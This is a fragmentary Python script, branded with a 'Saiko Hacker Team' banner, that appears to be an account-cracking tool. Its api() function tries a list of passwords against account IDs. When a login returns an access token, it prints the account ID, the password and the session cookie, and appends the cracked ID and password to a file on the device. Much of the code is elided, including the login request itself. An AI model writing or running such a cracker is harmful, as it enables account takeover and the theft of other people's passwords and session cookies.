...
logo= ("""\x1b[38;5;197m(WELCOM To Saiko Hacker Team )


  _____    __  __   _____   ____  _   ___     __
 |  __ \  |  \/  | |  __ \ / __ \| \ | \ \   / /
 | |__) | | \  / | | |__) | |  | |  \| |\ \_/ / 
 |  _  /  | |\/| | |  _  /| |  | | . ` | \   /  
 | | \ \ _| |  | | | | \ \| |__| | |\  |  | |   
...
def api(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\x1b[38;5;155m[➤] Himadro ~FINDING  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    ...
    try:
        ...
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\x1b[38;5;84m[Himadro-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')

                print('\033[1;92m[COOKIE] : ➤ : '+kuki+'\x1b[38;5;223m');linex()

                oks.append(ids)

                open('/sdcard/Himadro-OKS.txt','a').write(ids+' | '+pas+'\n')
